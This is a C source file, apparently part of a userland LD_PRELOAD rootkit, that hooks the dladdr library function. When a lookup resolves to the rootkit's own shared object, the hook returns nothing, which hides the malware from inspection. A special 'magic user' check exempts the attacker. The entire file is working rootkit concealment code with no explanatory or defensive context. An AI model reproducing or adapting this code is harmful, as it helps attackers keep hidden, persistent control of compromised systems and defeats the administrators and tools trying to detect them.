#include "../../util/util.h"

int dladdr(const void *addr, Dl_info *info){
    hook(CDLADDR);
    if(magicusr()) return (long)call(CDLADDR, addr, info);

    int noshow = 0;
    Dl_info bdvl_info;
    if((long)call(CDLADDR, addr, &bdvl_info) != 0){
        so = getbdvsoinf();
        if(so != NULL){
            if(strstr(so->soname, bdvl_info.dli_fname))
                noshow = 1;
            free(so);
            so = NULL;
        }else if(strstr(BDVLSO, bdvl_info.dli_fname)) noshow = 1;
    }

    if(noshow) return 0;
    return (long)call(CDLADDR, addr, info);
}
